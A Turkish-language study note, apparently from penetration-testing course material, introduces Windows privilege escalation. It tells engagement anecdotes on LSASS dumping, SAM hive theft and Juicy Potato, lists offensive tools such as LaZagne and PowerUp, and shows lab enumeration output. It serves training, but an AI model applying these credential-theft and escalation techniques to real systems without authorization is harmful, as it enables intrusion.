---
{"dg-publish":true,"permalink":"/active-directory/windows-privilege-escalation/"}
---


# Introduction to Windows Privilege Escalation

Bir yer edindikten sonra, ayrıcalıklarımızı yükseltmek kalıcılık için daha fazla seçenek sunacak ve ortamdaki erişimimizi ilerletebilecek lokal olarak depolanan bilgileri ortaya çıkarabilecektir. Windows ayrıcalık yükseltmenin genel amacı, belirli bir sisteme erişimimizi `Local Administrators` grubunun bir üyesine veya `NT AUTHORITY\SYSTEM` [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) hesabına yükseltmektir. Bununla birlikte, sistemdeki başka bir kullanıcıya yükseltmenin hedefimize ulaşmak için yeterli olabileceği senaryolar olabilir. Ayrıcalık yükseltme, genellikle herhangi bir etkileşim sırasında hayati bir adımdır. Elde edilen erişimi veya bulunan bazı verileri (kimlik bilgileri gibi) yalnızca yükseltilmiş bir bağlamda oturum açtığımızda kullanmamız gerekir. Bazı durumlarda, müşterimiz bizi " gold image" ya da "workstation breakout" tipi bir değerlendirme için işe alırsa, ayrıcalık yükseltme değerlendirmenin nihai hedefi olabilir. Ayrıcalık yükseltme genellikle bir ağ üzerinden nihai hedefimize doğru devam etmek ve yanal hareket için hayati önem taşır.

Bununla birlikte, aşağıdaki nedenlerden biri için ayrıcalıkları yükseltmemiz gerekebilir:

Bir müşterinin [altın imaj](“https://www.techopedia.com/definition/29456/golden-image”) Windows workstation ve sunucu derlemesini kusurlara karşı test ederken


1. Bir müşterinin [altın imaj](“https://www.techopedia.com/definition/29456/golden-image”) Windows workstation ve sunucu derlemesini kusurlara karşı test ederken  

2. Veritabanı gibi bazı lokal kaynaklara erişim elde etmek için lokal olarak ayrıcalıkları yükseltmek  

3. Müşterinin Active Directory ortamında yer edinmek için domain'e katılmış bir makinede [NT AUTHORITY\System](“https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account”) düzeyinde erişim elde etmek  

4. Müşterinin ağı içinde yanlara doğru hareket etmek veya ayrıcalıkları artırmak için kimlik bilgileri elde etmek

Sızma testi uzmanları olarak ayrıcalık yükseltmeye yardımcı olmak için kullanabileceğimiz birçok araç vardır. Yine de, belirli bir senaryoda mümkün olduğu ölçüde ayrıcalık yükseltme kontrollerinin nasıl yapılacağını ve kusurlardan `manuel olarak` nasıl yararlanılacağını anlamak da önemlidir. Bir müşterinin bizi internet erişimi olmayan, yoğun güvenlik duvarları olan ve USB bağlantı noktaları devre dışı bırakılmış yönetilen bir workstation'a yerleştirdiği durumlarla karşılaşabiliriz, bu nedenle herhangi bir araç/yardımcı komut dosyası yükleyemeyiz. Bu durumda, hem PowerShell hem de Windows komut satırını kullanarak Windows ayrıcalık yükseltme kontrollerini sağlam bir şekilde kavramak çok önemli olacaktır.  

Windows sistemleri geniş bir saldırı yüzeyi sunar. Ayrıcalıkları artırabileceğimiz yollardan sadece bazıları şunlardır:

![Pasted image 20241110204151.png](/img/user/resimler/Pasted%20image%2020241110204151.png)

### Senaryo 1 - Ağ Kısıtlamalarının Aşılması
Bir keresinde, internet erişimi olmayan ve USB portları engellenmiş, müşteri tarafından sağlanan bir sistemde ayrıcalıkları yükseltme görevi verilmişti. Uygulanan ağ erişim kontrolü nedeniyle, bana yardımcı olması için saldırı makinemi doğrudan kullanıcı ağına bağlayamadım. Değerlendirme sırasında, yazıcı VLAN'ının 80, 443 ve 445 numaralı portlar üzerinden giden iletişime izin verecek şekilde yapılandırıldığı bir ağ açığı bulmuştum. Ayrıcalıkları yükseltmeme ve LSASS prosesinin manuel bellek dökümünü yapmama izin veren izinlerle ilgili bir kusur bulmak için manuel numaralandırma yöntemlerini kullandım. Buradan, yazıcı VLAN'ındaki saldırı makinemde barındırılan bir SMB paylaşımını bağlayabildim ve LSASS DMP dosyasını dışarı çıkarabildim. Bu dosya elimdeyken, Mimikatz'ı çevrimdışı olarak kullanarak bir domain yöneticisinin NTLM parola hash'ini aldım; bu parolayı çevrimdışı olarak kırabilir ve istemci tarafından sağlanan sistemden bir domain denetleyicisine erişmek için kullanabilirdim.


### Scenario 2 - Pillaging Open Shares
Başka bir değerlendirme sırasında, kendimi iyi izlenen ve belirgin yapılandırma kusurları veya kullanımda olan savunmasız hizmetler/uygulamalar olmayan oldukça kilitli bir ortamda buldum. Tüm kullanıcıların içeriğini listelemesine ve üzerinde depolanan dosyaları indirmesine izin veren geniş açık bir dosya paylaşımı buldum. Bu paylaşım ortamdaki sanal makinelerin yedeklerini barındırıyordu. Ben özellikle sanal sabit sürücü dosyalarıyla (.VMDK ve .VHDX dosyaları) ilgileniyordum. Bu paylaşıma bir Windows sanal makinesinden erişebiliyor, .VHDX sanal sabit sürücüsünü lokal bir sürücü olarak bağlayabiliyor ve dosya sistemine göz atabiliyordum. Buradan SYSTEM, SAM ve SECURITY kayıt defteri kovanlarını aldım, Linux saldırı kutuma taşıdım ve secretsdump.py aracını kullanarak local administrator password hash'ini çıkardım. Kuruluş bir gold imaj kullanıyordu ve local administrator hash, pass-the-hash saldırısı yoluyla neredeyse tüm Windows sistemlerine yönetici erişimi sağlamak için kullanılabilirdi.


### **Senaryo 3 - Kimlik Bilgilerini Avlama ve Hesap Ayrıcalıklarını Kötüye Kullanma**  

Bu son senaryoda, kritik veritabanı sunucularına erişmek amacıyla oldukça kilitli bir ağa yerleştirildim. Müşteri bana standart bir domain kullanıcı hesabına sahip bir dizüstü bilgisayar sağladı ve ben de araçları ona yükleyebildim. Sonunda hassas bilgiler için dosya paylaşımlarını avlamak üzere [Snaffler](https://github.com/SnaffCon/Snaffler) aracını çalıştırdım. Veritabanı sunucularından birindeki bir veritabanına ait düşük ayrıcalıklı veritabanı kimlik bilgilerini içeren bazı `.sql` dosyalarına rastladım. Veritabanı kimlik bilgilerini kullanarak veritabanına bağlanmak, [xp_cmdshell](“https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15”) saklı prosedürünü etkinleştirmek ve yerel komut yürütme elde etmek için yerel olarak bir MSSQL istemcisi kullandım. Bu erişimi bir hizmet hesabı olarak kullanarak, local privilege escalation için kullanılabilecek [SeImpersonatePrivilege](“https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege”)'a sahip olduğumu doğruladım. Ayrıcalık yükseltmeye yardımcı olması için [Juicy Potato](“https://github.com/ohpe/juicy-potato”) 'nun özel olarak derlenmiş bir sürümünü host'a indirdim ve local admin kullanıcısı ekleyebildim. Bir kullanıcı eklemek ideal değildi, ancak bir beacon/reverse shell elde etme girişimlerim işe yaramadı. Bu erişimle, veritabanı hostuna uzaktan girebildim ve şirketin müşterilerinden birinin veritabanlarının tam kontrolünü ele geçirdim.  

```shell-session
M1R4CKCK@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student
```


# **Yararlı Araçlar**  

Yaygın ve belirsiz ayrıcalık yükseltme vektörleri için Windows sistemlerini listelememize yardımcı olacak birçok araç mevcuttur. Aşağıda, birçoğunu önümüzdeki modül bölümlerinde ele alacağımız yararlı binary ve scriptlerin bir listesi bulunmaktadır.

[Seatbelt](“https://github.com/GhostPack/Seatbelt”) : Çok çeşitli local privilege escalation kontrolleri gerçekleştirmek için C# projesi  

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) : WinPEAS, Windows host'larında ayrıcalıkları yükseltmek için olası yolları arayan bir scripttir. Tüm kontroller [burada](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) açıklanmıştır  

[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) : Yanlış yapılandırmalara dayanan yaygın Windows ayrıcalık yükseltme vektörlerini bulmak için PowerShell betiği. Bulunan bazı sorunlardan yararlanmak için de kullanılabilir  

[SharpUp](https://github.com/GhostPack/SharpUp) : PowerUp'ın C# sürümü  

[JAWS](https://github.com/411Hall/JAWS) : PowerShell 2.0'da yazılmış ayrıcalık yükseltme vektörlerini numaralandırmak için PowerShell betiği  

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) : SessionGopher, uzaktan erişim araçları için kaydedilmiş oturum bilgilerini bulan ve şifresini çözen bir PowerShell aracıdır. PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır  

[Watson](https://github.com/rasta-mouse/Watson) : Watson, eksik KB'leri numaralandırmak ve Privilege Escalation güvenlik açıkları için istismarlar önermek üzere tasarlanmış bir .NET aracıdır.  

[LaZagne](https://github.com/AlessandroZ/LaZagne) : Web tarayıcıları, sohbet araçları, veritabanları, Git, e-posta, bellek dökümleri, PHP, sysadmin araçları, kablosuz ağ yapılandırmaları, dahili Windows parola depolama mekanizmaları ve daha fazlasından yerel bir makinede depolanan parolaları almak için kullanılan araç  

[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) : WES-NG, Windows'un `systeminfo` yardımcı programının çıktısına dayanan, işletim sisteminin savunmasız olduğu güvenlik açıklarının listesini ve bu güvenlik açıkları için herhangi bir istismarı sağlayan bir araçtır. Windows XP ile Windows 10 arasındaki tüm Windows işletim sistemleri, Windows Server muadilleri de dahil olmak üzere desteklenmektedir

[Sysinternals Paketi](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) : [AccessChk](“https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk”), [PipeList](“https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist”) ve [PsService](“https://docs.microsoft.com/en-us/sysinternals/downloads/psservice”) dahil olmak üzere numaralandırmamızda Sysinternals'ın çeşitli araçlarını kullanacağız

Ayrıca `Seatbelt` ve `SharpUp` 'ın önceden derlenmiş binarylerini [burada](“https://github.com/r3motecontrol/Ghostpack-CompiledBinaries”) ve `LaZagne` 'nin bağımsız binarylerini [burada](“https://github.com/AlessandroZ/LaZagne/releases/”) bulabilirsiniz. Araçlarımızı bir istemci ortamında kullanırken her zaman kaynaktan derlememiz önerilir.  

Not: Bir sisteme nasıl erişim sağladığımıza bağlı olarak, araçları yüklemek için kullanıcımız tarafından yazılabilir birçok dizine sahip olmayabiliriz. `BUILTIN\Users` grubunun yazma erişimi olduğu için araçları `C:\Windows\Temp` `dizinine` yüklemek her zaman güvenli bir seçenektir.

Bu, kullanabileceğimiz araçların kapsamlı bir listesi değildir. Ayrıca, bir araç beklendiği gibi çalışmazsa veya hedef sisteme yükleyemezsek, her bir aracın ne yaptığını öğrenmeye çalışmalıyız. Yukarıda listelenenler gibi araçlar, kontrollerimizi daraltmak ve numaralandırmamıza odaklanmak için son derece yararlıdır. Bir Windows sistemini numaralandırmak, elenmesi ve anlamlandırılması gereken muazzam miktarda bilgi içeren göz korkutucu bir görev olabilir. Araçlar bu süreci daha hızlı hale getirebilir ve ayrıca bize okunması kolay bir formatta daha fazla çıktı verebilir. Bunun bir dezavantajı aşırı bilgi yüklemesi olabilir, çünkü `winPEAS` gibi bu araçlardan bazıları çoğunlukla bizim için yararlı olmayan inanılmaz miktarda bilgi döndürür. Araçlar iki ucu keskin bir kılıç olabilir. Numaralandırma sürecini hızlandırmaya ve bize son derece ayrıntılı çıktılar sağlamaya yardımcı olsalar da, çıktıyı nasıl okuyacağımızı veya en ilginç veri noktalarına nasıl indirgeyeceğimizi bilmiyorsak daha az verimli çalışıyor olabiliriz. Araçlar aynı zamanda yanlış pozitifler de üretebilir, bu nedenle işler ters gittiğinde veya göründüğü gibi olmadığında sorun gidermek için birçok olası ayrıcalık yükseltme tekniği hakkında derin bir anlayışa sahip olmamız gerekir. Numaralandırma tekniklerini manuel olarak öğrenmek, yanlış negatif veya yanlış pozitif gibi bir araçla ilgili bir sorun nedeniyle bariz kusurları kaçırmamamızı sağlamaya yardımcı olacaktır.

Bu modül boyunca, ele aldığımız çeşitli örnekler için manuel numaralandırma tekniklerini ve uygun olan yerlerde araç çıktılarını göstereceğiz. Numaralandırma tekniklerinin yanı sıra, istismar adımlarını manuel olarak nasıl gerçekleştireceğimizi öğrenmek ve kontrol edemediğimiz “autopwn” komut dosyalarına veya araçlarına güvenmemek de çok önemlidir. Hem numaralandırma hem de istismar adımlarını gerçekleştirmek için kendi araçlarımızı/komut dosyalarımızı yazmak iyidir (ve teşvik edilir!). Yine de, sürecin herhangi bir aşamasında müşterimize ne yaptığımızı tam olarak açıklayabilecek kadar her iki aşamada da kendimize güvenmeliyiz. Ayrıca araçları yükleyemediğimiz bir ortamda da çalışabilmeliyiz (hava boşluklu bir ağ veya internet erişimi olmayan veya USB flash sürücü gibi harici bir cihaz takmamıza izin vermeyen sistemler gibi).

Bu araçlar yalnızca sızma testi uzmanları için faydalı olmakla kalmaz, aynı zamanda bir değerlendirmeden önce düzeltilmesi gereken az sayıdaki sorunu tespit etmeye yardımcı olarak, birkaç makinenin güvenlik duruşunu periyodik olarak kontrol ederek, bir yükseltmenin veya diğer değişikliklerin etkisini analiz ederek veya yeni bir Gold Image'ı üretime almadan önce derinlemesine bir güvenlik incelemesi yaparak sistem yöneticilerine işlerinde yardımcı olabilir. Bu modülde gösterilen araçlar ve yöntemler, sistem yönetimi, mimari veya iç güvenlik ve uyumluluktan sorumlu herkese önemli ölçüde fayda sağlayabilir.

Her otomasyonda olduğu gibi, bu araçları kullanmanın riskleri olabilir. Nadiren de olsa, aşırı numaralandırma yapmak sistem kararsızlığına veya zaten kırılgan olduğu bilinen bir sistemde (veya sistemlerde) sorunlara neden olabilir. Ayrıca, bu araçlar iyi bilinmektedir ve bunların çoğu (hepsi olmasa da) yaygın anti-virüs çözümleri ve kesinlikle Cylance veya Carbon Black gibi daha gelişmiş EDR ürünleri tarafından tespit edilecek ve engellenecektir. `LaZagne` aracının [2.4.3](“https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe”) sürümünü yazarken en son sürümüne bakalım. Önceden derlenmiş ikili dosyayı Virus Total'e yüklediğimizde 47/70 ürünün bunu tespit ettiğini görüyoruz.

![Pasted image 20241110212601.png](/img/user/resimler/Pasted%20image%2020241110212601.png)

Kaçamaklı bir angajman sırasında bunu çalıştırmaya çalışsaydık muhtemelen olay yerinde yakalanırdık. Diğer değerlendirmeler sırasında, araçlarımızı çalıştırmak için atlamamız gereken korumalarla karşılaşabiliriz. Bu modülün kapsamı dışında olsa da, araçlarımızı yaygın AV ürünlerinden geçirmek için yorumları kaldırmak, fonksiyon adlarını değiştirmek, yürütülebilir dosyayı şifrelemek gibi çeşitli yöntemler kullanabiliriz. Bu teknikler daha sonraki bir modülde öğretilecektir. Hedef müşterimizin, değerlendirdiğimiz hostlarda Windows Defender'ı bu modül için faaliyetlerimizi engellemeyecek şekilde geçici olarak ayarladığını varsayacağız. Mümkün olduğunca çok sayıda sorun arıyorlar ve oyunun bu aşamasında savunmalarını test etmek istemiyorlar.


## **Ağ Bilgileri**  

Ağ bilgilerini toplamak, numaralandırma işlemimizin çok önemli bir parçasıdır. Hostun dual-homed olduğunu ve hostu tehlikeye atmanın daha önce erişemediğimiz ağın başka bir bölümüne yanal olarak geçmemize izin verebileceğini bulabiliriz. Dual-homed, host ya da sunucunun iki ya da daha fazla farklı ağa ait olduğu ve çoğu durumda birkaç sanal ya da fiziksel ağ arayüzüne sahip olduğu anlamına gelir. Lokal ağ ve etrafındaki ağlar hakkındaki bilgileri görüntülemek için her zaman [yönlendirme tablolarına](“https://en.wikipedia.org/wiki/Routing_table”) bakmalıyız. Domain controller'ların IP adresleri de dahil olmak üzere yerel domain hakkında da bilgi toplayabiliriz (eğer host Active Directory ortamının bir parçasıysa). Her arayüz için ARP önbelleğini görüntülemek ve hostun yakın zamanda iletişim kurduğu diğer hostları görüntülemek için [arp](“https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp”) komutunu kullanmak da önemlidir. Bu, kimlik bilgilerini aldıktan sonra yanal hareket konusunda bize yardımcı olabilir. Yöneticilerin bu hosttan RDP veya WinRM aracılığıyla hangi hostlara bağlandığına dair iyi bir gösterge olabilir.

Bu ağ bilgileri, lokal ayrıcalık yükseltmemize doğrudan veya dolaylı olarak yardımcı olabilir. Bizi erişebileceğimiz veya ayrıcalıkları yükseltebileceğimiz bir sisteme giden başka bir yola yönlendirebilir veya mevcut sistemde ayrıcalıkları yükselttikten sonra erişimimizi ilerletmek için yanal hareket için kullanabileceğimiz bilgileri ortaya çıkarabilir.


#### **Interface(s), IP Address(es), DNS Information**

```cmd-session
C:\htb> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-90-94
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)
   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM
   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

#### ARP Table
```cmd-session
C:\htb> arp -a

Interface: 10.129.43.8 --- 0x4
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-4d-df     dynamic
  10.129.43.12          00-50-56-b9-da-ad     dynamic
  10.129.43.13          00-50-56-b9-5b-9f     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  224.0.0.253           01-00-5e-00-00-fd     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.20.56 --- 0x9
  Internet Address      Physical Address      Type
  192.168.20.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```


#### Routing Table
```cmd-session
C:\htb> route print

===========================================================================
Interface List
  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter
  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25
          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271
       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281
      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281
   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271
    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271
   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281
        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281
  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0     192.168.20.1  Default
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  4    281 ::/0                     fe80::250:56ff:feb9:4ddf
  1    331 ::1/128                  On-link
  4    281 dead:beef::/64           On-link
  4    281 dead:beef::e4db:5ea3:2775:8d4d/128
                                    On-link
  4    281 fe80::/64                On-link
  9    271 fe80::/64                On-link
  4    281 fe80::e4db:5ea3:2775:8d4d/128
                                    On-link
  9    271 fe80::f055:fefd:b1b:9919/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
  9    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

## **Enumerating Protections**

Çoğu modern ortamda, tehditleri proaktif olarak izlemek, uyarmak ve engellemek için çalışan bir tür anti-virüs veya Endpoint Detection and Response (EDR) hizmeti vardır. Bu araçlar numaralandırma sürecine müdahale edebilir. Özellikle bir tür herkese açık PoC exploit veya aracı kullanıyorsak, ayrıcalık yükseltme işlemi sırasında büyük olasılıkla bir tür zorluk çıkaracaklardır. Korumaları yerinde numaralandırmak, engellenmeyen veya tespit edilmeyen yöntemleri kullandığımızdan emin olmamıza yardımcı olacak ve özel payload'lar oluşturmamız veya araçları derlemeden önce değiştirmemiz gerektiğinde bize yardımcı olacaktır.

Birçok kuruluş, belirli kullanıcıların ne tür uygulamaları ve dosyaları çalıştırabileceğini kontrol etmek için bir tür uygulama beyaz listeleme çözümü kullanır. Bu, yönetici olmayan kullanıcıların `cmd.exe` veya `powershell.exe` veya günlük işleri için gerekli olmayan diğer binary ve dosya türlerini çalıştırmasını engellemeye çalışmak için kullanılabilir. Microsoft tarafından sunulan popüler bir çözüm [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)'dır. GetAppLockerPolicy cmdlet'ini kullanarak local, effective (enforced) ve domain AppLocker ilkelerini listeleyebiliriz. Bu, hangi binary'lerin veya dosya türlerinin engellenebileceğini ve numaralandırma sırasında veya ayrıcalıkları yükseltmek için bir araç veya teknik çalıştırmadan önce bir tür AppLocker bypass'ı gerçekleştirmemiz gerekip gerekmediğini görmemize yardımcı olacaktır.

Gerçek dünyadaki bir etkileşimde, client muhtemelen en yaygın araçları/komut dosyalarını (önceki bölümde tanıtılanlar dahil) tespit eden korumalara sahip olacaktır. Bunlarla başa çıkmanın yolları vardır ve kullanılan korumaları listelemek, araçlarımızı bir laboratuvar ortamında değiştirmemize ve bir client sistemine karşı kullanmadan önce test etmemize yardımcı olabilir. Bazı EDR araçları `net.exe`, `tasklist` vb. gibi yaygın binary'lerin kullanımını tespit eder veya hatta engeller. Kuruluşlar, bir kullanıcının çalıştırabileceği binaryleri kısıtlayabilir veya bir muhasebecinin makinesinde cmd.exe aracılığıyla belirli binarylerin çalıştırıldığını göstermesi gibi şüpheli etkinlikleri hemen işaretleyebilir. Erken numaralandırma ve müşterinin ortamını ve yaygın AV ve EDR çözümlerine karşı geçici çözümleri derinlemesine anlamak, kaçamak olmayan bir angajman sırasında bize zaman kazandırabilir ve kaçamak bir angajmanı yapabilir veya bozabilir.

#### **Windows Defender Durumunu Kontrol Etme**
```powershell-session
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :
```

#### List AppLocker Rules

```powershell-session
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

